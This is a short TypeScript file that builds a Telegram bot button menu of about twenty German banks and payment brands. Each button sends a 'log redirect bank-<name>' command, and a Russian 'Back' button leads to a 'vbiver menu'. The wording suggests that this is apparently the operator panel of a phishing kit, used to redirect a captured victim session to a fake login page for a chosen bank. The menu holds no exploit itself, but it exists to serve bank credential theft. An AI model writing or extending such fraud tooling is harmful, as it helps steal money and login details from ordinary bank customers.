export const deBankList = (id: number) => {
  return {
    "reply_markup":{
      "inline_keyboard":[
        [
          {
            "text":"🔹 SPARKASSE",
            "callback_data": `log redirect bank-sparkasse ${id} false`
          },
          {
            "text":"🔹 AMAZON",
            "callback_data": `log redirect bank-amazon ${id} false`
          }
        ],
        [
          {
            "text":"🔹 BARCLAYS",
            "callback_data": `log redirect bank-barclays ${id} false`
          },
          {
            "text":"🔹 MILES & KREDIT",
            "callback_data": `log redirect bank-milesAndKredit ${id} false`
          }
        ],
        [
          {
            "text":"🔹 TARGO BANK",
            "callback_data": `log redirect bank-targobank ${id} false`
          },
          {
            "text":"🔹 ING",
            "callback_data": `log redirect bank-ing ${id} false`
          }
        ],
        [
          {
            "text":"🔹 DKB",
            "callback_data": `log redirect bank-dkb ${id} false`
          },
          {
            "text":"🔹 HANSEATIC",
            "callback_data": `log redirect bank-hanseatic ${id} false`
          }
        ],
        [
          {
            "text":"🔹 HVB",
            "callback_data": `log redirect bank-hvb ${id} false`
          },
          {
            "text":"🔹 DEUTSCHE",
            "callback_data": `log redirect bank-deutsche ${id} false`
          }
        ],
        [
          {
            "text":"🔹 VR (DZ)",
            "callback_data": `log redirect bank-vr(dz) ${id} false`
          }
        ],
        [
          {
            "text":"🔹 POSTBANK",
            "callback_data": `log redirect bank-postbank ${id} false`
          },
          {
            "text":"🔹 ADVANZIA",
            "callback_data": `log redirect bank-advanzia ${id} false`
          }
        ],
        [
          {
            "text":"🔹 ADAC",
            "callback_data": `log redirect bank-adac ${id} false`
          },
          {
            "text":"🔹 LBB",
            "callback_data": `log redirect bank-lbb ${id} false`
          }
        ],
        [
          {
            "text":"🔹 COMMERZ",
            "callback_data": `log redirect bank-commerz ${id} false`
          },
          {
            "text":"🔹 N26",
            "callback_data": `log redirect bank-n26 ${id} false`
          }
        ],
        [
          {
            "text":"🔹 SANTANDER",
            "callback_data": `log redirect bank-santander ${id} false`
          }
        ],
        [
          {
            "text":"Назад",
            "callback_data": `log vbiver menu ${id}`
          }
        ]
      ]
    }
  }
}